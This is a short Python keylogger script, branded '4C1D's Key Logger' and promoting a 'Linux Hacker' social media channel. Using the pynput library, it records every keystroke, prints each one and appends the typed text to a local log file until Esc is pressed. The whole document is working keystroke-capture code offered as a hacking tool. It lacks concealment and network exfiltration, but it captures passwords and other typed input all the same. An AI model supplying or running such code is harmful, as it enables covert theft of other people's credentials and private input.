import pynput


print("\033[1;36;40m\n")
print("""{}
  _  _    ____ _ ____                
 | || |  / ___/ |  _ \               
 | || |_| |   | | | | |              
 |__   _| |___| | |_| |              
  _ |_|__\____|_|____/               
 | |/ / ____\ \ / /                  
 | ' /|  _|  \ V /                   
 | . \| |___  | |                    
 |_|\_\_____| |_|_  ____ _____ ____  
 | |   / _ \ / ___|/ ___| ____|  _ \ 
 | |  | | | | |  _| |  _|  _| | |_) |
 | |__| |_| | |_| | |_| | |___|  _ < 
 |_____\___/ \____|\____|_____|_| \_\                                    
{}\n\tWelcome To 4C1D's Key Logger\n\t*Check Text_Logger.txt To See All Of The Logs*\n\tSubscribe To Linux Hacker On YT, And Follow linux_hacker_4c1d On IG\n{}""".format("="*100,"="*100,"="*100))
print("\033[1;34;40m\n")
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
	global keys, count

	keys.append(key)
	count += 1
	print("{0} pressed".format(key))

	if count >= 10:
		count = 0
		write_file(keys)
		keys = []


def write_file(keys):
	with open("Text_Logger.txt", "a") as f:
		for key in keys:
			k = str(key).replace("'","")
			if k.find("space") > 0:
				f.write('\n')
			elif k.find("Key") == -1:
				f.write(k)


def on_release(key): 
	if key == Key.esc:
		return False


with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join() 
